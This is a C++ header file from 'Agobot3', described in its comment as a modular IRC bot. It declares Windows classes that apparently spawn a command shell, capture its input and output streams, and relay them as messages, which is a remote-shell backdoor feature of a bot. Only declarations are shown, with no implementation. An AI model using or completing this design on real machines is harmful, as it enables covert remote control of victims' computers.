/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#ifndef __CMDSHELL_H__
#define __CMDSHELL_H__

#ifdef _WIN32

class CStdOut_Listen : public CThread
{
public:
				 CStdOut_Listen();
	virtual		~CStdOut_Listen();

	void		*Run();

	CMessage	*m_pMessage;
	HANDLE		 m_hStdOut;
};

class CCmdShell : public CCommandHandler
{
public:
					 CCmdShell();
	virtual			~CCmdShell();

	void			 Init();

	bool			 HandleCommand(CMessage *pMsg);

	command			 m_cmdFallBackHandler,
					 m_cmdEnable,
					 m_cmdDisable;

	bool			 m_bEnabled;

	HANDLE			 m_hStdIn;
	HANDLE			 m_hStdOut;
	HANDLE			 m_hStdErr;

	HANDLE			 m_hProcess;

	STARTUPINFO		 m_sinfo;

	CMessage		 m_mMessage;

	CStdOut_Listen	*m_pStdOut;
	CStdOut_Listen	*m_pStdErr;
};

#endif // _WIN32

#endif // __CMDSHELL_H__
